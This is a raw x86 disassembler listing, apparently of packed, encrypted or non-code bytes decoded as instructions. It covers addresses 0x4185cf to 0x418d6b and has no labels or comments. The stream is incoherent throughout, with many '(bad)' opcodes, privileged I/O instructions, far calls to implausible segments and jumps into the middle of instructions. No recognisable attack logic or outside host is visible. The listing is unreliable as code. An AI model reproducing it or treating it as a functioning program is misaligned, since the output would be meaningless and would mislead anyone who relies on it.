  4185cf:	popa   
  4185d0:	hlt    
  4185d1:	mov    bl,0x86
  4185d3:	push   edi
  4185d4:	fst    QWORD PTR [eax]
  4185d6:	and    al,0xd
  4185d8:	xchg   ebx,eax
  4185d9:	mov    ds:0x56bb01c5,al
  4185de:	popa   
  4185df:	pop    ecx
  4185e0:	sbb    esi,0x2412115
  4185e6:	out    0x2b,al
  4185e8:	int    0xa
  4185ea:	std    
  4185eb:	fisub  DWORD PTR [ecx+0x79]
  4185ee:	es iret 
  4185f0:	jnp    0x418628
  4185f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f3:	adc    al,0x6d
  4185f5:	or     DWORD PTR [eax],0xe2f35154
  4185fb:	pop    ebp
  4185fc:	sbb    al,0x28
  4185fe:	push   eax
  4185ff:	fld    st(2)
  418601:	mov    dh,0x6c
  418603:	adc    BYTE PTR [ebp+0x6090174b],bl
  418609:	into   
  41860a:	in     eax,0xf7
  41860c:	(bad)  
  41860d:	and    edx,DWORD PTR [edi+0x64]
  418610:	sbb    al,BYTE PTR [edi+0x35101aea]
  418616:	retf   0xec6a
  418619:	test   al,0xca
  41861b:	push   ebx
  41861c:	sahf   
  41861d:	push   edi
  41861e:	mov    WORD PTR [esi],?
  418620:	mov    ah,dl
  418622:	retf   
  418623:	int    0xfc
  418625:	stos   BYTE PTR es:[edi],al
  418626:	int3   
  418627:	in     eax,0xac
  418629:	pop    ecx
  41862a:	mov    ebx,0x48ec8559
  41862f:	rol    BYTE PTR [esi+0x10],0x23
  418633:	aaa    
  418634:	add    al,0xf7
  418636:	sbb    ebp,DWORD PTR [edx+0x76]
  418639:	mov    eax,0xe56373fe
  41863e:	lods   al,BYTE PTR ds:[esi]
  41863f:	lods   al,BYTE PTR ds:[esi]
  418640:	(bad)  
  418641:	sbb    dl,al
  418643:	xor    esp,ebp
  418645:	push   ss
  418646:	icebp  
  418647:	fwait
  418648:	push   0xa2d681ee
  41864d:	fisub  DWORD PTR [esi+0x77ce75b]
  418653:	mov    cl,0xf2
  418655:	xchg   edx,eax
  418656:	pop    ebp
  418657:	inc    ecx
  418658:	mov    cl,0xf0
  41865a:	push   edi
  41865b:	mov    bl,0x65
  41865d:	jge    0x41865f
  41865f:	or     bl,ah
  418661:	frstor [edx-0x40]
  418664:	mov    BYTE PTR ds:0xfbaef,bl
  41866a:	add    BYTE PTR [edx+0x25],dl
  41866d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41866e:	adc    al,0x76
  418670:	test   al,0x68
  418672:	and    eax,0x36ddca02
  418677:	lods   al,BYTE PTR ds:[esi]
  418678:	xchg   DWORD PTR [edx],esi
  41867a:	xchg   BYTE PTR [edx+0x15511e53],ch
  418680:	jbe    0x418614
  418682:	mov    esi,0x4904dad4
  418687:	shufps xmm0,XMMWORD PTR [eax+0x5d],0xa2
  41868c:	mov    al,ds:0x65c712b
  418691:	xor    DWORD PTR [ebp-0x2f],ecx
  418694:	xor    edi,DWORD PTR [eax-0x48a28abf]
  41869a:	jmp    0xe0b64150
  41869f:	or     DWORD PTR [eax-0x12],eax
  4186a2:	test   esi,0xa7c210f3
  4186a8:	xchg   esi,eax
  4186a9:	jno    0x4186a8
  4186ab:	test   BYTE PTR [eax-0x25],al
  4186ae:	mov    al,0x98
  4186b0:	sbb    eax,0xc1ebadf0
  4186b5:	fiadd  DWORD PTR [esp+edx*2]
  4186b8:	mov    eax,0x4c23e0c
  4186bd:	mov    ch,0xa3
  4186bf:	push   ds
  4186c0:	sub    eax,0xc1117497
  4186c5:	in     eax,dx
  4186c6:	jbe    0x41865b
  4186c8:	call   0x4968:0xfaa9f1b9
  4186cf:	mov    dh,0x46
  4186d1:	fistp  QWORD PTR [esi-0x39470c3c]
  4186d7:	mov    ?,WORD PTR [edx+0x51]
  4186da:	xchg   ebp,eax
  4186db:	jno    0x41873a
  4186dd:	xlat   BYTE PTR ds:[ebx]
  4186de:	popa   
  4186df:	adc    DWORD PTR [esp+edx*8],esp
  4186e2:	stos   DWORD PTR es:[edi],eax
  4186e3:	clc    
  4186e4:	cld    
  4186e5:	dec    ebx
  4186e6:	enter  0xb09,0xe3
  4186ea:	das    
  4186eb:	(bad)  
  4186ec:	popa   
  4186ed:	popa   
  4186ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ef:	test   al,0x98
  4186f1:	retf   
  4186f2:	mov    ecx,0x48165bc8
  4186f7:	das    
  4186f8:	push   esi
  4186f9:	repz fmul st,st(4)
  4186fc:	mov    ds:0x82118c30,al
  418701:	add    DWORD PTR [ebx],edx
  418703:	fld    TBYTE PTR [ecx]
  418705:	ret    
  418706:	ds leave 
  418708:	fs sbb eax,0x7eba94a9
  41870e:	fnstenv [edx-0x12]
  418711:	jge    0x41873c
  418713:	and    edi,esi
  418715:	mov    ch,BYTE PTR ds:0xb1bf1cad
  41871b:	or     al,0xdf
  41871d:	fld    DWORD PTR [edx-0x44]
  418720:	shl    BYTE PTR [ebp-0x4c],0x50
  418724:	fiadd  WORD PTR [ebx+0x52]
  418727:	push   edx
  418728:	cmp    eax,DWORD PTR [edx+0x57]
  41872b:	dec    ebp
  41872c:	(bad)  
  41872d:	jae    0x41875f
  41872f:	and    al,0x9e
  418731:	(bad)  
  418732:	ret    0x67c3
  418735:	shl    DWORD PTR [ebx+0x42bab8a7],0x22
  41873c:	rol    ah,0x19
  41873f:	cld    
  418740:	xchg   DWORD PTR [ebx-0x215634da],ebx
  418746:	nop
  418747:	iret   
  418748:	pop    edi
  418749:	cmp    ecx,DWORD PTR [ebx+0x45]
  41874c:	scas   eax,DWORD PTR es:[edi]
  41874d:	push   edx
  41874e:	pusha  
  41874f:	(bad)  
  418750:	adc    edx,ebx
  418752:	xchg   esp,eax
  418753:	leave  
  418754:	dec    ebp
  418755:	push   0x90920ff
  41875a:	mov    eax,DWORD PTR [edx]
  41875c:	push   0xffffffac
  41875e:	mov    esp,0x96049e8c
  418763:	inc    esp
  418764:	les    edx,FWORD PTR [ecx]
  418766:	cmp    DWORD PTR [esi-0x46],0xdf88811f
  41876d:	push   ds
  41876e:	int    0x2
  418770:	dec    ebx
  418771:	xchg   edi,eax
  418772:	cmp    dl,BYTE PTR [esi]
  418774:	dec    edx
  418775:	dec    edx
  418776:	imul   eax,edi,0xc4ed10d4
  41877c:	xor    al,BYTE PTR [esi+0x3d]
  41877f:	pop    ebp
  418780:	dec    ecx
  418781:	shl    BYTE PTR [edi+0x24],cl
  418784:	cmp    BYTE PTR [ebx+ecx*1],dh
  418787:	retf   
  418788:	iret   
  418789:	mov    eax,ds:0x6ee0db20
  41878e:	sub    al,0x9f
  418790:	pop    ecx
  418791:	stc    
  418792:	frstor cs:[esi+eiz*2]
  418796:	inc    esp
  418797:	(bad)  
  418798:	push   edi
  418799:	ror    edx,0xfa
  41879c:	(bad)  
  41879d:	cmp    dl,BYTE PTR [edx-0x18]
  4187a0:	les    ebx,FWORD PTR [ecx-0x62feb1c9]
  4187a6:	shr    DWORD PTR [ebx-0x34e36c5b],0x2d
  4187ad:	ds jb  0x418798
  4187b0:	dec    ecx
  4187b1:	mov    ds:0x9ce9d239,eax
  4187b6:	or     edx,DWORD PTR [edi-0x50f048e8]
  4187bc:	jl     0x4187d2
  4187be:	(bad)  [ebp+eax*1+0x309ee1c6]
  4187c5:	mov    ebx,0x3e8292dc
  4187ca:	stc    
  4187cb:	pop    ds
  4187cc:	stos   DWORD PTR es:[edi],eax
  4187cd:	push   edi
  4187ce:	pop    edi
  4187cf:	cld    
  4187d0:	dec    ebp
  4187d1:	cmp    BYTE PTR [ebx-0x185ea897],0x8f
  4187d8:	pop    eax
  4187d9:	xor    BYTE PTR [eax+0x111471c5],ch
  4187df:	push   ss
  4187e0:	mov    WORD PTR [ebp+ebx*4-0x24e57492],ds
  4187e7:	inc    ebx
  4187e8:	fnstsw WORD PTR [edi]
  4187ea:	or     eax,DWORD PTR [esi]
  4187ec:	imul   esi,ebp,0xe9654d3b
  4187f2:	int3   
  4187f3:	and    BYTE PTR [ebx],dl
  4187f5:	ja     0x4187ea
  4187f7:	sub    eax,DWORD PTR [edi+0x7a]
  4187fa:	add    ecx,ebp
  4187fc:	in     al,0x74
  4187fe:	loope  0x41884f
  418800:	jge    0x41883a
  418802:	pushf  
  418803:	push   esp
  418804:	or     ah,BYTE PTR [esp+eiz*8-0x3f97af32]
  41880b:	dec    esi
  41880c:	lds    ecx,FWORD PTR [eax+0x579f2d89]
  418812:	out    dx,al
  418813:	bound  ecx,QWORD PTR ds:0xdc7527c0
  418819:	(bad)  
  41881a:	mov    ebx,0xbc9d1750
  41881f:	add    eax,0x208ef1f1
  418824:	push   esp
  418825:	mov    dh,0xf5
  418827:	bound  ebp,QWORD PTR [eax]
  418829:	mov    ebp,gs
  41882b:	lods   al,BYTE PTR ds:[esi]
  41882c:	cmp    dl,bl
  41882e:	pop    es
  41882f:	in     eax,0x8d
  418831:	or     eax,0xd6dd78ea
  418836:	repz fwait
  418838:	mov    esp,ss
  41883a:	mov    ecx,0xbdfd3e28
  41883f:	imul   ebp,edx,0x629f77a7
  418845:	aaa    
  418846:	cmc    
  418847:	dec    edi
  418848:	addr16 retf 0x6d21
  41884c:	ins    DWORD PTR es:[edi],dx
  41884d:	jmp    0x418862
  41884f:	cmp    BYTE PTR [edx],dl
  418851:	cli    
  418852:	xor    bl,cl
  418854:	cmp    esp,ecx
  418856:	pop    edx
  418857:	cwde   
  418858:	xor    al,BYTE PTR [ecx]
  41885a:	jl     0x4187e0
  41885c:	adc    cl,BYTE PTR [eax+0x5a]
  41885f:	xor    al,0x1d
  418861:	shl    esi,cl
  418863:	scas   al,BYTE PTR es:[edi]
  418864:	arpl   WORD PTR [edx+0x4c77afc1],bx
  41886a:	jo     0x418803
  41886c:	mov    ds:0x936cb5ee,eax
  418871:	or     eax,0xdb2ea89f
  418876:	jmp    0x2c4a:0xcf1f65d8
  41887d:	sub    BYTE PTR [ecx+ebp*1-0x47],ah
  418881:	xchg   edi,eax
  418882:	sub    DWORD PTR [eax],edx
  418884:	or     DWORD PTR [edx],esi
  418886:	push   0x5937a6d8
  41888b:	mov    bh,0x0
  41888d:	jne    0x4188e8
  41888f:	out    dx,eax
  418890:	leave  
  418891:	or     eax,0x8f191fca
  418896:	cdq    
  418897:	mov    bh,0xe8
  418899:	clc    
  41889a:	push   cs
  41889b:	pop    DWORD PTR [eax-0x4b0f4f91]
  4188a1:	add    BYTE PTR [edx],bh
  4188a3:	sub    DWORD PTR [esi],eax
  4188a5:	xchg   edx,eax
  4188a6:	ja     0x418862
  4188a8:	test   ah,0x4d
  4188ab:	lods   al,BYTE PTR ds:[esi]
  4188ac:	pop    es
  4188ad:	mov    ds:0x81aab11b,eax
  4188b2:	(bad)  
  4188b4:	pop    es
  4188b5:	ja     0x4188f3
  4188b7:	shl    BYTE PTR [edx+edi*4],1
  4188ba:	es adc eax,0x59073b89
  4188c0:	xchg   edx,eax
  4188c1:	and    esp,DWORD PTR [edi-0x12]
  4188c4:	sub    eax,0x7cb71310
  4188c9:	imul   ecx,edx,0x20
  4188cc:	ds sub eax,0x5c0a018c
  4188d2:	mov    esp,ebx
  4188d4:	mov    ah,0xff
  4188d6:	push   edi
  4188d7:	jbe    0x4188e6
  4188d9:	or     eax,eax
  4188db:	inc    ecx
  4188dc:	fld    DWORD PTR [eax+0x6c]
  4188df:	sub    dl,ch
  4188e1:	sbb    eax,0x17f38000
  4188e6:	sbb    ecx,edi
  4188e8:	imul   BYTE PTR ds:0x892b195d
  4188ee:	clc    
  4188ef:	outs   dx,DWORD PTR ds:[esi]
  4188f0:	adc    cl,BYTE PTR [ebp+0x48]
  4188f3:	int3   
  4188f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188f5:	lods   al,BYTE PTR ds:[esi]
  4188f6:	or     al,0x3c
  4188f8:	adc    DWORD PTR [esi+0x35da3855],ecx
  4188fe:	jmp    0x55685cfc
  418903:	fadd   DWORD PTR [eax]
  418905:	adc    eax,0x5d2c8158
  41890a:	gs mov esi,0xdb987317
  418910:	pop    ebx
  418911:	dec    esi
  418912:	call   0xd0c7b0ca
  418917:	xchg   BYTE PTR [eax+0x59],al
  41891a:	sbb    eax,DWORD PTR [ebp-0x53abf0f8]
  418920:	data16 sti 
  418922:	test   eax,0x48d3b10a
  418927:	add    al,0x81
  418929:	fcomp  st(3)
  41892b:	sbb    ebp,ebp
  41892d:	je     0x4188b4
  41892f:	add    eax,0xd2fce853
  418934:	popa   
  418935:	jmp    0x41895a
  418937:	push   esi
  418938:	scas   al,BYTE PTR es:[edi]
  418939:	int3   
  41893a:	mov    eax,0x9f5f6f2b
  41893f:	lea    eax,[eax+0x3e6eaafb]
  418945:	push   ss
  418946:	pop    edx
  418947:	lods   eax,DWORD PTR ds:[esi]
  418948:	mov    al,0x6d
  41894a:	sbb    DWORD PTR [esi],edi
  41894c:	xor    BYTE PTR [edx+0x5b],bh
  41894f:	mov    bh,0x5b
  418951:	dec    eax
  418952:	or     BYTE PTR [ebp-0x72129cfe],dl
  418958:	xchg   esp,eax
  418959:	pop    edx
  41895a:	mov    gs,WORD PTR [edi-0x6fc0770b]
  418960:	ficom  DWORD PTR [esi+0xd]
  418963:	xchg   ah,bl
  418965:	push   ebx
  418966:	mov    ebp,0x7f56de9b
  41896b:	mov    ch,0x8e
  41896d:	mov    ss,WORD PTR [ecx+0x71baa0ee]
  418973:	mov    edx,esi
  418975:	bound  ecx,QWORD PTR [ebx]
  418977:	sbb    eax,0xd8d817fc
  41897c:	inc    esi
  41897d:	call   0x1917:0x3690d678
  418984:	inc    esp
  418985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418986:	jnp    0x41897b
  418988:	inc    ebx
  418989:	ja     0x41896c
  41898b:	popf   
  41898c:	jg     0x418993
  41898e:	sub    eax,0xe33ad67b
  418993:	call   0x8bf6:0x26f092e4
  41899a:	div    ah
  41899c:	std    
  41899d:	(bad)  
  41899e:	and    eax,0xd6523a1b
  4189a3:	sbb    BYTE PTR [edi],0x65
  4189a6:	clc    
  4189a7:	out    0x60,eax
  4189a9:	dec    esi
  4189aa:	into   
  4189ab:	xchg   edi,eax
  4189ac:	mov    bl,0x63
  4189ae:	add    al,0x9c
  4189b0:	pop    ss
  4189b1:	cmp    al,0x65
  4189b3:	xor    eax,eax
  4189b5:	jne    0x4189df
  4189b7:	or     ecx,DWORD PTR [esp+eiz*8+0x7f]
  4189bb:	jl     0x418a2d
  4189bd:	fist   DWORD PTR [ebx-0x2854f167]
  4189c3:	(bad)  
  4189c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189c5:	in     eax,dx
  4189c6:	test   BYTE PTR [edi+0x2b],ch
  4189c9:	fnstcw WORD PTR ds:0x73a40169
  4189cf:	int    0xf5
  4189d1:	clc    
  4189d2:	sar    BYTE PTR [edx+0x59064dbe],0x1b
  4189d9:	iret   
  4189da:	ja     0x418a0d
  4189dc:	push   esi
  4189dd:	mov    DWORD PTR [edi+0x2c],esi
  4189e0:	mov    eax,ds:0xce4fa195
  4189e5:	pop    esp
  4189e6:	imul   edx,ebx,0xd26d0743
  4189ec:	jne    0x4189f1
  4189ee:	std    
  4189ef:	xor    ch,al
  4189f1:	mov    ah,0xfc
  4189f3:	cmp    al,BYTE PTR [ebx+0x57]
  4189f6:	fs jno 0x4189cf
  4189f9:	inc    ebx
  4189fa:	jg     0x4189e1
  4189fc:	push   es
  4189fd:	pop    edi
  4189fe:	pushf  
  4189ff:	lea    esp,[esi]
  418a01:	add    eax,0x219bfc48
  418a06:	push   esp
  418a07:	inc    esp
  418a08:	test   BYTE PTR [ebp-0x5f],cl
  418a0b:	pop    esi
  418a0c:	jl     0x418a6a
  418a0e:	xacquire xchg DWORD PTR ss:[ecx+0xfd326c0],edi
  418a16:	push   ecx
  418a17:	adc    al,0xdd
  418a19:	int3   
  418a1a:	gs mov ch,0xa
  418a1d:	mov    bl,0xea
  418a1f:	std    
  418a20:	lds    ecx,FWORD PTR [ebx+0x25]
  418a23:	inc    ebp
  418a24:	or     bl,BYTE PTR [eax+edi*1]
  418a27:	repz jmp 0x48e83f22
  418a2d:	faddp  st(1),st
  418a2f:	adc    eax,0x98bfae62
  418a34:	sub    DWORD PTR [edx],0xe9799e17
  418a3a:	cmp    al,0x4b
  418a3c:	fst    QWORD PTR [edi-0x6851a506]
  418a42:	and    edx,DWORD PTR [esi-0x38]
  418a45:	cmp    DWORD PTR [esi-0x6a],esi
  418a48:	(bad)  
  418a49:	mul    BYTE PTR ds:0xb05bfaa8
  418a4f:	test   dl,ah
  418a51:	hlt    
  418a52:	push   esp
  418a53:	(bad)  
  418a54:	ret    0xad55
  418a57:	rcr    DWORD PTR [edx],cl
  418a59:	mov    DWORD PTR [ecx+edi*4],ebx
  418a5c:	outs   dx,BYTE PTR ds:[esi]
  418a5d:	sbb    al,0xe9
  418a5f:	repnz (bad) [edx+0x65]
  418a63:	mov    esp,0xdce98580
  418a68:	mov    dh,0x17
  418a6a:	push   ebx
  418a6b:	loop   0x418a3c
  418a6d:	push   ecx
  418a6e:	jae    0x418a05
  418a70:	adc    BYTE PTR [ebx+0x65],ah
  418a73:	push   ecx
  418a74:	sub    esi,eax
  418a76:	(bad)
  418a79:	adc    eax,0xa4d3a366
  418a7e:	stos   DWORD PTR es:[edi],eax
  418a7f:	fstp   DWORD PTR [esi]
  418a81:	or     al,0xc3
  418a83:	xchg   edi,eax
  418a84:	imul   ebp,ebp,0xffffffa5
  418a87:	mov    ebp,?
  418a89:	ja     0x418a99
  418a8b:	(bad)  
  418a8d:	fdiv   QWORD PTR [ecx+0x6c]
  418a90:	add    al,BYTE PTR [ecx+0x48ad427b]
  418a96:	xchg   esp,eax
  418a97:	cs mov edi,ebx
  418a9a:	jg     0x418ae6
  418a9c:	sub    al,0xbf
  418a9e:	jmp    0x87a8a1ac
  418aa3:	sbb    BYTE PTR [ebx-0x51],ch
  418aa6:	and    DWORD PTR [eax-0x250604ec],edx
  418aac:	xchg   esi,eax
  418aad:	and    eax,0xf115c872
  418ab2:	or     ecx,ebp
  418ab4:	pop    eax
  418ab5:	(bad)  
  418ab6:	stc    
  418ab7:	pop    ds
  418ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ab9:	repz sbb eax,0x4ba77146
  418abf:	adc    dh,0xc2
  418ac2:	ds mov eax,eax
  418ac5:	jno    0x418a5a
  418ac7:	xchg   edx,eax
  418ac8:	xlat   BYTE PTR ds:[ebx]
  418ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aca:	sub    ecx,DWORD PTR [eax-0x7c]
  418acd:	(bad)  
  418ace:	cmc    
  418acf:	jp     0x418aa3
  418ad1:	dec    esi
  418ad2:	or     ebx,edi
  418ad4:	adc    DWORD PTR [edi-0x62],ebp
  418ad7:	outs   dx,DWORD PTR ds:[esi]
  418ad8:	sbb    eax,0xc96a90b0
  418add:	dec    esp
  418ade:	jne    0x418a91
  418ae0:	push   0xffffffa9
  418ae2:	add    BYTE PTR [ecx+eiz*1+0x34a186cb],al
  418ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aea:	nop
  418aeb:	(bad)  
  418aec:	fild   QWORD PTR [ebp+0x1a]
  418aef:	std    
  418af0:	pop    ebx
  418af1:	xchg   DWORD PTR [ebx+0x1f],edx
  418af4:	mov    dl,0x6b
  418af6:	cmp    DWORD PTR [esi],0x4a
  418af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418afa:	stos   BYTE PTR es:[edi],al
  418afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418afc:	cmp    eax,0xfa5f059e
  418b01:	pop    ds
  418b02:	dec    edx
  418b03:	out    0xdb,eax
  418b05:	sti    
  418b06:	fs dec ebx
  418b08:	repnz push ss
  418b0a:	ficomp WORD PTR [edx]
  418b0c:	add    dl,0x8f
  418b0f:	dec    ebp
  418b10:	and    eax,0x31ed612f
  418b15:	cli    
  418b16:	or     BYTE PTR ds:0x9527ed22,cl
  418b1c:	(bad)  
  418b1d:	inc    ebx
  418b1e:	dec    ebx
  418b1f:	push   es
  418b20:	xor    BYTE PTR [esi+0x4a20d868],bl
  418b26:	xor    dl,BYTE PTR [ebx+0x7c]
  418b29:	ins    DWORD PTR es:[edi],dx
  418b2a:	jmp    0xca09c5af
  418b2f:	cmp    dh,dl
  418b31:	mov    bh,0x62
  418b33:	add    eax,DWORD PTR [ebx]
  418b35:	cmc    
  418b36:	btc    DWORD PTR [edx],edi
  418b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b3a:	sub    al,0xb5
  418b3c:	jg     0x418bb4
  418b3e:	inc    edx
  418b3f:	cmp    bh,BYTE PTR [edi+esi*8-0x5a215ed9]
  418b46:	bound  edi,QWORD PTR [edx-0x60d98db7]
  418b4c:	jp     0x418bcc
  418b4e:	in     eax,dx
  418b4f:	ins    BYTE PTR es:[edi],dx
  418b50:	retf   0x8709
  418b53:	xor    DWORD PTR [edx-0x5e],0xffffffc0
  418b57:	inc    ebp
  418b58:	cwde   
  418b59:	jl     0x418ae0
  418b5b:	inc    ebx
  418b5c:	ret    0x8e6
  418b5f:	arpl   bp,bp
  418b61:	cmp    BYTE PTR [eax],bh
  418b63:	jo     0x418b1f
  418b65:	int3   
  418b66:	sub    BYTE PTR [edi+0x12ea8867],0x33
  418b6d:	into   
  418b6e:	mov    edx,0xac6d1444
  418b73:	push   0xffffff85
  418b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b76:	or     eax,0xd9db963a
  418b7b:	ret    
  418b7c:	sub    ah,BYTE PTR [ecx]
  418b7e:	in     al,dx
  418b7f:	fwait
  418b80:	fs daa 
  418b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b83:	inc    esp
  418b84:	popf   
  418b85:	retf   
  418b86:	in     al,dx
  418b87:	adc    DWORD PTR [ecx+eax*2],edi
  418b8a:	test   edx,edx
  418b8c:	ins    BYTE PTR es:[edi],dx
  418b8d:	sub    BYTE PTR es:[ecx+esi*2-0x430efbff],0x83
  418b96:	pop    esi
  418b97:	cmc    
  418b98:	cmp    eax,0x9fdab034
  418b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b9e:	bound  edi,QWORD PTR [edx*2+0x4e187646]
  418ba5:	scas   eax,DWORD PTR es:[edi]
  418ba6:	pushf  
  418ba7:	in     eax,dx
  418ba8:	je     0x418b4d
  418baa:	add    BYTE PTR [ecx+0x10735aaa],dl
  418bb0:	daa    
  418bb1:	shl    BYTE PTR [eax],1
  418bb3:	cmp    al,0x7
  418bb5:	sbb    ecx,eax
  418bb7:	pop    edi
  418bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb9:	mov    gs,WORD PTR [ebp+0x77891c1f]
  418bbf:	adc    al,0xee
  418bc1:	jno    0x418c1f
  418bc3:	push   es
  418bc4:	cmp    cl,BYTE PTR [ecx-0x4a]
  418bc7:	imul   esp,esp,0x4925a055
  418bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bce:	xor    esp,DWORD PTR [ecx+0x25]
  418bd1:	outs   dx,DWORD PTR ds:[esi]
  418bd2:	in     al,dx
  418bd3:	adc    ebp,DWORD PTR [edi-0x1f]
  418bd6:	inc    esp
  418bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bd8:	push   ebp
  418bd9:	int3   
  418bda:	or     eax,0x97069a46
  418bdf:	sbb    esp,DWORD PTR [edi]
  418be1:	mov    ecx,0x8d416f75
  418be6:	rcr    ecx,cl
  418be8:	fincstp 
  418bea:	(bad)  
  418beb:	fidivr DWORD PTR [edi-0x3e]
  418bee:	push   edi
  418bef:	mov    BYTE PTR [esi],bl
  418bf1:	pop    esi
  418bf2:	hlt    
  418bf3:	dec    edi
  418bf4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418bf6:	out    0x70,eax
  418bf8:	jmp    FWORD PTR [edi+0x3c7f856a]
  418bfe:	sbb    ebp,edi
  418c00:	xor    edi,DWORD PTR [eax]
  418c02:	js     0x418bc9
  418c04:	out    0x33,al
  418c06:	adc    eax,0xb47a82be
  418c0b:	or     esi,ebp
  418c0d:	inc    ebp
  418c0e:	leave  
  418c0f:	cmp    BYTE PTR [ebp+eiz*8-0x6d],0x6
  418c14:	jo     0x418be1
  418c16:	ror    DWORD PTR [ebx+0x5ae6d3d4],cl
  418c1c:	jnp    0x418bf5
  418c1e:	adc    dl,BYTE PTR [ecx+0x190b89bf]
  418c24:	shr    DWORD PTR [edx+edx*2-0x52aada9a],1
  418c2b:	push   cs
  418c2c:	push   ecx
  418c2d:	(bad)  
  418c2e:	push   0xdec212ad
  418c33:	loope  0x418c8f
  418c35:	mov    cl,0x55
  418c37:	inc    edx
  418c38:	hlt    
  418c39:	push   cs
  418c3a:	imul   DWORD PTR [eax+0x1e]
  418c3d:	fisttp WORD PTR [ebp-0x3]
  418c40:	enter  0x5754,0x31
  418c44:	dec    esp
  418c45:	pop    edi
  418c46:	daa    
  418c47:	imul   edi,DWORD PTR [esi+0x7e982154],0x28
  418c4e:	enter  0xaf8d,0xf0
  418c52:	imul   BYTE PTR [ebp-0x45]
  418c55:	add    eax,0x43456082
  418c5a:	loope  0x418c0f
  418c5c:	fsub   DWORD PTR [esp+esi*4+0x5c]
  418c60:	jp     0x418c85
  418c62:	mov    edx,0x8ed7557
  418c67:	xchg   ebx,eax
  418c68:	push   ds
  418c69:	dec    ecx
  418c6a:	dec    esp
  418c6b:	sbb    edx,ebp
  418c6d:	lock xchg ecx,eax
  418c6f:	test   eax,0xc0e789fa
  418c74:	fnstsw WORD PTR [ebp*4+0x288f77a2]
  418c7b:	cmp    eax,0x5ef23458
  418c80:	adc    DWORD PTR [ebp+0x31],edx
  418c83:	xchg   esp,eax
  418c84:	scas   al,BYTE PTR es:[edi]
  418c85:	xchg   edx,eax
  418c86:	fcomi  st,st(7)
  418c88:	cmc    
  418c89:	push   edi
  418c8a:	scas   al,BYTE PTR es:[edi]
  418c8b:	in     al,0xa4
  418c8d:	test   DWORD PTR [ecx-0x2a],ebp
  418c90:	fst    QWORD PTR [esi]
  418c92:	mov    ch,0xda
  418c94:	inc    edx
  418c95:	hlt    
  418c96:	and    al,0x44
  418c98:	jecxz  0x418ce6
  418c9a:	jmp    0xf9f33d6b
  418c9f:	jno    0x418caa
  418ca1:	dec    edx
  418ca2:	aad    0xcc
  418ca4:	pop    ebx
  418ca5:	das    
  418ca6:	(bad)  
  418ca7:	or     BYTE PTR [ebx-0x27a3e022],bh
  418cad:	xlat   BYTE PTR ds:[ebx]
  418cae:	out    0x2c,eax
  418cb0:	in     eax,0x8a
  418cb2:	mov    eax,ss:0x6547a71e
  418cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cb9:	hlt    
  418cba:	cmp    eax,0xf47fdb12
  418cbf:	xchg   esi,eax
  418cc0:	and    esi,DWORD PTR [ecx+0x20]
  418cc3:	fstp   TBYTE PTR [edi]
  418cc5:	imul   esi,DWORD PTR [ebx],0x12
  418cc8:	clc    
  418cc9:	imul   eax,DWORD PTR ss:[ebx+edx*2],0xe7ec5c6c
  418cd1:	cmp    esp,DWORD PTR [edx+0xa]
  418cd4:	in     al,dx
  418cd5:	cmp    al,0xe5
  418cd7:	add    edi,DWORD PTR [eax]
  418cd9:	xchg   ebx,eax
  418cda:	jge    0x418cf1
  418cdc:	(bad)  
  418cdd:	sub    DWORD PTR [ebx-0x6e4bd402],eax
  418ce3:	mov    ah,0x50
  418ce5:	jg     0x418cff
  418ce7:	mov    edx,DWORD PTR [esi+0x5c]
  418cea:	mov    ds:0xa122e765,al
  418cef:	jmp    0x418cb2
  418cf1:	js     0x418cfc
  418cf3:	xchg   esi,eax
  418cf4:	or     eax,0x5429e233
  418cf9:	jns    0x418cab
  418cfb:	in     eax,0xe6
  418cfd:	stos   DWORD PTR es:[edi],eax
  418cfe:	mov    DWORD PTR [esi+0x6f5fb894],ebp
  418d04:	inc    esp
  418d05:	in     al,dx
  418d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d07:	(bad)  
  418d08:	adc    al,al
  418d0a:	cwde   
  418d0b:	xor    al,0x93
  418d0d:	mov    dh,0x80
  418d0f:	adc    DWORD PTR [eax-0x3e],edx
  418d12:	das    
  418d13:	pop    ss
  418d14:	and    ecx,DWORD PTR [edx-0x46]
  418d17:	fbld   TBYTE PTR [esi-0x1c]
  418d1a:	das    
  418d1b:	jne    0x418d11
  418d1d:	scas   eax,DWORD PTR es:[edi]
  418d1e:	mov    bl,0xe8
  418d20:	fucom  st(1)
  418d22:	mov    esp,0x195a1770
  418d27:	retf   
  418d28:	xchg   edx,eax
  418d29:	loopne 0x418cb4
  418d2b:	jbe    0x418d8b
  418d2d:	lea    ecx,[ecx]
  418d2f:	out    0xd2,eax
  418d31:	jl     0x418d65
  418d33:	mov    edx,0x52e39764
  418d38:	dec    esp
  418d39:	jnp    0x418cf5
  418d3b:	jae    0x418d4b
  418d3d:	add    BYTE PTR [edi],0xbd
  418d40:	jno    0x418da6
  418d42:	fmul   DWORD PTR [esi+0x72]
  418d45:	inc    ebp
  418d46:	ret    
  418d47:	jno    0x418d73
  418d49:	(bad)
  418d4d:	sub    eax,0x3a4bc983
  418d52:	cmp    eax,0xe0aeed0
  418d57:	fmul   st(3),st
  418d59:	std    
  418d5a:	mov    edx,0x218c0e7
  418d5f:	rcr    BYTE PTR ds:0xa5f33b5e,1
  418d65:	mov    al,fs:0xd70096be
  418d6b:	push   cs
